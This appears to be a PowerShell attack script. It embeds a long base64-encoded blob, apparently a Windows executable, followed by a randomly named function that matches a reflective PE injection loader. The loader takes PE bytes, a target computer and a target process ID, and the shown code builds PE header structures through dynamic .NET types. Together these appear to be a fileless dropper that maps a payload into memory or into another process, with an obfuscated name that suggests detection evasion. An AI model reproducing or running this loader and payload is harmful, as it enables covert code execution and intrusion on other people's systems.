'sTX9NQo2azZ8Ns423jYfN2M33TePOCA5Yjm1ORU6aDpGO287yjvXOxg8UDyHPJk8ojzkPMo9dz7APoA//z8AAAAgAQBYAAAAozCBMbAxyzEPMvcyTzOLNOw0lzbTNik3NzdFN1M3YDfSN3M5pznHOdQ5eTqCOtI64DruOvw6CTuwPL08Kz00PYA9jT3BPco9Cz5kPs8+AAAAMAEApAAAABIwZDByMIAwjTD1MGcxcDGtMbsxyTHXMeUx8jEAMnoy' + 
'OzRENIw0mjSoNLY0wzT/NH81iDXENdI14DXuNfw1CjYYNiY2NDZCNk82XTadNqk2tjaVN543ADgOOBw4Kjg3OEU4fTgBOTY5gzkLOhw6zjrgOgk7IDtbO2o7djuvO8E71zvjOzc8UjyJPKY83Tz6PDE9Tj1vP6M/4j8AAABAAQDQAAAAujACMQMyUTJrMpwy5zIRM0gzsDPsMzE0bzQFNU01XTWdNQs2ajYJNxw3Kzc6N3c3qje9N8w32zeYOKk4' + 
'ujjLOAU5FjknOTg5cjmDOZQ5pTnfOfA5AToSOkw6XTpuOn86uTrKOts67DomOzc7SDtZO5M7pDu1O8Y7ADwRPCI8MzxtPH48jzygPNo86zz8PA09Rz1YPWk9ej20PcU91j3nPSE+Mj5DPlQ+jj6fPrA+wT77Pgw/HT8uP2g/eT+KP5s/1T/mP/c/AAAAUAEAMAEAAAgwQjBTMGQwdTCvMMAw0TDiMBwxLTE+MU8xiTGaMasxvDH2MQcyGDIpMmMy' + 
'dDKFMpYy0DLhMvIyAzM9M04zXzNwM6ozuzPMM90zFzQoNDk0SjSENJU0pjS3NPQ0BTUWNSc1ZDV1NYY1lzXUNeU19jUHNkQ2VTZmNnc2tDbFNtY25zYkNzU3RjdXN5Q3pTe2N8c3BDgVOCY4Nzh0OIU4ljinOOQ49TgGORc5VDllOXY5hznEOdU55jn3OTQ6RTpWOmc6pDq1OsY61zoUOyU7NjtHO4Q7lTumO7c79DsFPBY8JzxkPHU8hjyXPNQ8' + 
'5Tz2PAc9RD1VPWY9dz20PcU91j3nPSQ+NT5GPlc+lD6lPrY+xz4EPxU/Jj83P3Q/hT+WP6c/5D/1PwAAAGABALgAAAAGMBcwVDBlMHYwhzDQMt4yKzM6M/AzFTSSNLw01TTgNOw0ADUINQw1EDUUNRg1HDUgNSQ1KDU2NUg1VjVaNWw1gDWlNbQ1xDUaNiU2LDY8Nkc2VjZiNnM2fTaDNpU2pjaxNrg2yDbTNuI27jYDNww3EzcZNy83SjdZN143' + 
'ZDd9N4M3jTefN8E30jfcN+c3FTgmOD04aDihOMY5Cj1DPUs9XD2IPa89/D1qPjk/kz8AAABwAQA4AAAAVDEaNTw4oznfOQA6hDqbOmk7fDs5PEY8TjyePM087D0YPkw+VT5mPtc+MD+JP+o/AIABABQAAAB6M4U1JjrLP/8/AAAAkAEAsAAAALcw1zNuNKo0+DQ6NWo1yTVzNrs2xzbONtQ25jb0NgA3FDccNyA3JDcoNyw3MDc0Nzg3PDdKN4E3' + 
'nzeuN703zDfhNzU4RThTOGE4xjnTOcI6/jpPO2M7cTuAO2E8kDycPLA8uDy8PMA8xDzIPMw80DzUPNg85jzuPPY8/jwGPQ49Fj0ePUg9Uz1bPWg9fT2KPZ09rD3GPRY+eD6WPrQ+BD8iP0A/9j8AAACgAQAoAAAACTAdME4wZTC7MEQxqDS1NFE1ejXeOHg9ST50Plk/rD8AsAEARAIAAD4wRjBOMFYwujDwMP0wJjFcMWkxkjHIMdUx/jE0MkEy' + 
'ajKgMq0y3DISMywzYTOfM9EzETRFNIc0pjSuNLY0vjT1NAM1CDUTNRk1HjUpNS81NDU/NUU1SjVVNVs1YDVrNXE1djWBNYc1jDWXNZ01ojWtNbM1uDXDNck1zjXZNd815DXvNfU1+jUFNgs2EDYbNiE2JjYxNjc2PDZHNk02UjZdNmM2aDZzNnk2fjaJNo82lDafNqU2qja1Nrs2wDbLNtE21jbhNgM4DzgcOE44UjhWOG44fDiAOJw4pDioOKw4' + 
'sDi0OLg4vDjAOMQ4yDjMONA41DjYONw44DjkOOg47DjwOPQ4+Dj8OAA5GDkwOTQ5SDloOXA5dDl4OXw5gDmEOYg5jDmQOaw5zDnUOdg53DngOeQ56DnsOfA59DkQOjA6ODo8OkA6RDpIOkw6UDpUOlg6dDqUOpw6oDqkOqg6rDqwOrQ6uDq8Otg6+DoAOwQ7CDsMOxA7FDsYOxw7IDs8O1w7ZDtoO2w7cDt0O3g7fDuAO4Q7oDvAO8g7zDvQO9Q7' + 
'2DvcO+A75DvoOwg8KDwwPDQ8ODw8PEA8RDxIPEw8UDxwPJA8mDycPKA8pDyoPKw8sDy0PLg81Dz0PPw8AD0EPQg9DD0QPRQ9GD0cPTw9XD1kPWg9bD1wPXQ9eD18PYA9hD2gPcA9yD3MPdA91D3YPdw94D3kPeg9DT4bPio+QT5zPq8+vj7VPv0+Cz8aPzE/Yz+fP64/xT/tP/s/AMABAMQAAAAKMCEwTjDVMOQwBTEUMSsxOjFRMWAxdzGGMZ0x' + 
'rDHDMdIx5jH1MQYyODJHMl4y1TLjMvIyCTNkNX84jTgsOWQ5kzmuOcY5JjpgOnc6kDrYOvU6LTtGO107sDvgOxo8Njw6PD48QjxGPEo8TjxSPFY8WjxePGI8ZjxqPG48cjx2PHo8fjyCPIY8ijycPLQ8vj7CPsY+yj7OPtI+1j7aPt4+4j7mPuo+7j7yPvY++j7+PgI/Bj8KPw4/Ej8AAADQAQD0AAAA5jBRMWgxgTG8MdkxDTImMj0yeDKjMuYy' + 
'AzM5M1UzWTNdM2EzZTNpM20zcTN1M3kzfTOBM4UziTONM5EzlTOZM50zoTOlM6kzuzPTM9A11DXYNdw14DXkNeg17DXwNfQ1+DX8NQA2BDYINgw2EDYUNhg2HDYgNiQ2+DcUOjM6SzpjOtI66Tr8Og47jDuhO7Y7uzvIO+g7AjwHPNg8Oj1HPWI9aD18PYE9YT6GPpM+nj6/PtU+7T7yPhc/Iz8vPzk/Qz9NP1g/Yj9oP3o/iD+QP5g/oD+oP7A/' + 
'uD/AP8g/0D/YP+A/6D/wP/g/AAAA4AEAaAMAAAAwOzBHME4wWTBjMHUwhDCkMKwwsDC0MLgwvDDAMMQwyDDMMOAwADEIMQwxEDEUMRgxHDEgMSQxKDFAMWAxaDFsMXAxdDF4MXwxgDGEMYgxnDG8McQxyDHMMdAx1DHYMdwx4DHkMfQxFDIcMiAyJDIoMiwyMDI0MjgyPDJMMmwydDJ4MnwygDKEMogyjDKQMpQypDLEMswy0DLUMtgy3DLgMuQy' + 
'6DLsMvwyHDMkMygzLDMwMzQzODM8M0AzRDNUM3QzfDOAM4QziDOMM5AzlDOYM5wztDPUM9wz4DPkM+gz7DPwM/Qz+DP8MwA0BDQINAw0GDQ4NEA0RDRINEw0UDRUNFg0XDRgNHA0gDSMNJA0mDScNKA0pDSoNKw0sDS0NLg0vDTANMQ0zjTSNOQ09TT5NAw1ITVENVA1VDVkNWw1cDV0NXg1fDWANYQ1iDWMNZA1lDWYNZw1oDWkNag1rDWwNbQ1' + 
'uDW8NcA1xDXINcw10DXUNdg13DXgNeQ16DXsNfA19DX4Nfw1ADYENgg2DDYaNiI2NDZCNkY2WDZxNnw2jDacNqQ2qDasNrA2tDa4Nrw2wDbENsg2zDbQNtQ22DbcNuA25DboNuw28Db0Nvg2/DYANwQ3CDcMNxA3FDcYNxw3IDckNyg3LDcwNzQ3ODc8N0A3RDdIN0w3UDdUN1g3XDdsN303gTeUN7Q3vDfAN8Q3yDfMN9A31DfYN9w34DfkN+g3' + 
'7DfwN/Q3+DcEOCQ4LDgwODQ4ODg8OEA4RDhIOEw4UDhUOFg4XDhgOGQ4aDh8OIg4nDikOKg4rDiwOLQ4uDi8OMA4xDjIOMw40DjUONg43DjgOO44BDkkOSw5MDk0OTg5PDlAOUQ5SDlMOVA5VDlYOVw5YDlkOWg5gDmgOag5rDmwObQ5uDm8OcA5xDnIOcw50DnUOdg53DngOeQ56Dn8OQg6HDokOig6LDowOjQ6ODo8OkA6RDpIOkw6UDpUOlg6' + 
'XDpgOm46hDqkOqw6sDq0Org6vDrAOsQ6yDrMOtg6+DoAOwQ7CDsMOxA7FDsYOxw7IDskOyg7NDtUO1w7YDtkO2g7bDtwO3Q7eDt8O4w7rDu0O7g7vDvAO8Q7yDvMO9A71DsKPGs9gj2JPY8+nD6pPrs+wD5SP8Q/5z8AAADwAQCMAAAAATATMD0wnTDaMGMxrTHaMYQyszL3Mv4yFTNhM7Uz0DOMNKI08TQONTs1WDW/NRc2ZjZvNn02zzY3N4Q3' + 
'qjfTNww4IjiZOLY49DggOVk5SzqLOt86HDupO0Q8VjxzPKI8uDz/PBw9UT1rPa89zD0xPk8+jj6zPts+7T4KPzM/aD/LP/I/AAACAFgAAAAsMEIwazC+MMkw0zBWMXMxzDEdMlIyaDKcM7kz+TN9Ne81azahNsA2EDcoNxQ4TTj4OBA5xTndOSQ6WTvBPMg8GT0gPXQ97D3zPUY+TT6ZPwAQAgCsAAAAETAYMHYwfTCeMHAydzJNNFk0aDTINM00' + 
'9DT8NAs1UDVVNXQ1hTVBNkg2wTZMN3s3KjhsOI84bjmPOZM5lzmbOZ85ozmnOas5rzmzObc5uzm/OcM5xznLOc850znXOds53znjOec59DoYOzw7yzz0PCQ9oz3dPec99z39PRE+Gz4pPjk+UT5dPmk+hj6iPqk+zz7cPus++z5EP1E/Xz+uP7M/AAAAIAIAmAEAAA0wKjAvMFowcTCrMBgxPjFzMXoxkTFWMocyjjKlMvUyCTMWMyIzKjM6M3Mz' + 
'ozOoM9QzMTQ8NEk0XzRpNHM0gzSUNKQ0qjSzNMA04TTmNAA1BTUfNck11DVfNm42njajNrU20zbfNuY28DYINyI3LDc2N0A3TzdZN2s3GDgxOFg4ZDhoOHg4gDiEOIg4jDiQOJQ4mDicOKA4pDioOKw4sDi0OLg4vDjAOMQ4yDjMONA41DjYONw44DjkOOg47DjwOPQ4+Dj8OAA5BDkIOQw5EDkUORg5HDkgOSQ5Mjk6OVA5YjlmOXw5mTmkObQ5' + 
'xDnMOdA51DnYOdw54DnkOeg57DnwOfQ5+Dn8OQA6BDoIOgw6EDoUOhg6HDogOiQ6KDosOjA6NDo4Ojw6QDpEOkg6TDpQOlQ6WDpcOmA6ZDpoOmw6cDp0Ong6fDqAOoQ6iDqcOrE6tTrdOuc67DryOvc6jzulO/87HDxYPG48vTzaPAY9RT1+PYw9qT0TPis+SD7LPvI+Gj9bP5c/pj/HP+Y/AAAAMAIAhAAAALUw3DBDMZIxmzGpMfsxYzKhMs4y' + 
'5TIUM0gziDOeMxU0MjRwNJw01jTxNL01CzZfNpw2KTfNN+k3+TcWODM4Zjh8OMo45zgdOTc5fzmcOQE6HzpeOoM6sTrQOuA6/ToaO0M7djvXO/47LjxEPGc8tTzSPCg9eT29PR0/jz8AQAIAyAAAAAswQTBgMLAwyDC0Me0xmDKwMmUzfTPEM/k0YzVvNXw1/DUINhw2JDYoNiw2MDY0Njg2PDZANkQ2SDZMNlo2YjZqNnI2hDakNqw2sDa0Nrg2' + 
'vDbANsQ2yDbMNnM3dzd7N383gzeHN4s3jzeTN5c3mzefN2M4cTh/OI04mzipOLc4xTjTOOE47zj9OAs5GTknOTU5QzlROV85bTl7OYk5lzmlObM5wTnPOd056zn5OQc6FTojOjE6PzpNOls6aTp3OgBQAgBcAAAAeTKMMp8ysjLFMt0y7jL5MgUzFzMiMzgz9DOENEs1mjXCNeo1DzY0Nlk2mjYWNxo3HjciNyY3KjcuNzI3hzeLN483kzeXN5s3' + 
'nzejN1o4ZzqjO588AGACAEAAAABdMYE0FTUVNrM2ujbWNto23jbiNuY26jbuNvI21Ti6Os07Oz6HPqA+rT7YPvE+/j4pP0I/Tz9bPwBwAgBsAAAABTByNao1kDYKOBE4Mzg3ODs4PzhDOEc4SzhPOFM4VzhbOPE6RztLO087UztXO1s7XztjO2c7aztvO3M7dzt7O387gzuHO4s7jzuTO5c7mzu5O707wTvFO8k7zTvRO9U72TvdOwCAAgBcAAAA' + 
'ZjfEN8g3zDfQN9Q32DfcN+A35DfoN+w38Df0N/g3/DcAOAQ4CDgMOBA4FDgYODY4Ojg+OEI4RjhKOE44UjhWOKk4BDksOWU5UzqQO8c8cD7oPoY/AJACANgAAABcMIQwmzCyMNEw/zBDMU8xVjFgMWoxdDF+MZAxrjG8MeMxQDJOMmoyxDLWMuQyKzOlM9ozFzSaNKw0wDQRNTA1PDVQNVg1XDVgNWQ1aDVsNXA1dDV4NXw1gDWONbs17DUqNog2' + 
'qDawNrQ2uDa8NsA2xDbINsw20Db8Ngo3GDcnNzU3kDfnNws4ZjjWOHU5hzmwOdU5+DkIOlE6/Tp8O5w7pDuoO6w7sDu0O7g7vDvAO8Q78Dv+Oww8GzwpPIg8Qz2zPU0+Xz7lPnw/ij++PwAAAKACALQAAAAIMCkwyzA9MWQxljFEMmQybDJwMnQyeDJ8MoAyhDKIMowyxjLUMuEy8TIoM1YzZjO3M8UzADRiNEE1TzVcNYo1mjXvNf01KDZFNqs2' + 
'hDeSN6A3rTfTN044XDjsODI5VTn3OV46mTqnOts6Fzs4O1A7Fzw5PHQ86DwMPRg9LD00PTg9PD1APUQ9SD1MPVA9VD1iPYg9nj2sPco99j00PtE+3z7tPko/az+sPwAAALACAOgAAABgMGwwgDCIMIwwkDCUMJgwnDCgMKQwqDCsMLAwvjD9MC0xbjF8MZ0xwDHmMRgyJjI3MkEyRjJVMmUyjzLiMu8y/TIWM0AzhzPGMxY0NTRGNFw0hTSmNMQ0' + 
'FDUuNUA1kDXENSw29DYANxQ3HDcgNyQ3KDcsNzA3NDc4Nzw3QDdEN1I3iTe5Nww4LDg0ODg4PDhAOEQ4SDhMOFA4VDhYOFw4kjigOK44vDgXOZY5JjpTOgA7RDtfO207szvLO0s8PD2+Pd89Dj4cPl8+bj5+Po8+nz69Ps0+6z7+PmY/dj/nPwDAAgB4AAAABDAhMD8wXTB7MN0x6zH5MTIyRTJVMo0yPzNdM7kzZTR7NI40pDS3NM004DSGNbc1' + 
'mzbXNm035jcAOBA4OjjSOPA4DjlKOV85bTmIOZk51DnMOv86UTt+O1k8azx5PKA8ID0+PWo9nD2pPcU9/D0AAADQAgBUAQAARDBRMF8wdzCPMKcwvzDXMO8wBzEfMVIxbTF9M6QzwDM8NFw0/zQNNUs1cDWWNaM2szbkNvE2+zYANww3FjcbNyc3MTc2N0I3TDdRN283eTd+N4o3oDfgN+039zf8Nwg4EjgXODE4WDhqOKA4vDjHONQ4BjkVOSQ5' + 
'LjlCOUw5UTldOWc5bDl4OYI5hzmTOZ05ojmwOcU54zkHOhc6KTo9OlY6YzpwOn86jDqbOqg6tzrEOug67jr6OgY7Ejs5Oz87SDtUO2Y7gjuMO5E7mzulO7Q7wDvKO8872zvlO+o79jsAPAU8DzwgPCo8Lzw5PEU8TzxUPGA8ajxvPHk8hzyWPK08tTzDPMw8/jwHPUs9Yz1sPYc9kD27PcE96T0APgk+Iz4tPjg+QT5pPpE+yj7XPuY+9T4MP1g/' + 
'Xz9lP20/fT+IP5M/mj+mP8o/6T8A4AIAWAAAAAAw+zIHMw4zGDMiMywzMjNEM1szbjOAM4wzkDOcM6AzvDPAM9Qz2DPcM+Az7DPwM/wzADQENAg0JDQoNIQ0iDS0NLg0zDTQNNQ02DTgNAAAAPACAHQAAAACMBQwGzAfMCUwKTAvMDYwOjBUMF0wZjByMHwwhjCQMJ8wqzC3MLwwxjDLMNUw2jDkMOkw8zD4MAIxBzERMRYxIDElMS8xNDE+MUMx' + 
'TTFSMVwxYTFrMXAxezGCMYkxkDGXMZ4xpTGsMboxAAAAAAMAhAAAAEozVDNjM28zdzOBM4wzlDOZM6gzyTPmM/AzADQMNCU0LDQ3NEg0UzRpNHo0jzSbNKM0rTSyNLc0vDTBNMc0zDTRNNc03jTkNOs08TT4NP40BTULNRI1JDU2NUM1TzVcNWg1ezWHNZE1mDWiNak1szXANdI14jXqNfc1AAAAEAMAsAAAAEgwaDCIMKgwyDDoMAgxKDFIMSw3' + 
'MDc0Nzg3PDdAN7Q3uDe8N8A3VDhcOGA4hDiIOKw4sDi0OLg4vDjAOMQ4yDjMONA41DjYONw44DjkOOg47DjwOPQ4+Dj8OAA5BDkIOQw5EDkUORg5HDkgOSQ5KDksOTA5NDk4OTw5QDl8OYQ5jDmUOZw5pDmsObQ5vDnEOcw51DncOeQ57Dn0Ofw5BDoMOhQ6HDokOgAgAwB4AQAAQDRENEg0TDRQNFQ0WDRcNGA0ZDRoNGw0cDR0NHg0fDSANIQ0' + 
'iDSMNJA0qDSsNLA01DTYNNw04DTkNOg07DQANQg1DDUQNRQ1GDUcNSA1JDUoNSw1MDU0NTg1PDVANUQ1SDVMNVA1VDVYNVw1YDVkNWg1bDVwNXQ1eDV8NYA1hDWINYw1kDWUNZg1nDWgNaQ1qDWsNbA1tDW4Nbw1wDXENcg1zDXQNdQ12DXcNeA15DXoNew18DX0Nfg1/DUANgQ2CDYMNhA2FDYYNhw2IDYkNig2LDYwNjQ2ODY8NkA2RDZINkw2' + 
'UDZUNlg2XDZgNmQ2aDZsNnA2dDZ4Nnw2gDaENog2jDaQNpQ2mDacNqA2pDaoNqw2sDa0Nrg2vDbANsQ2yDbMNtA21DbYNtw24DbkNug27DbwNvQ2+Db8NgA3BDcINww3EDcUNxg3HDcgNyQ3KDcsNzA3NDc4Nzw3QDdEN0g3TDdQN1Q3WDdcN2A3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';

function Invoke-wfpnQBjgeYsffkM
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
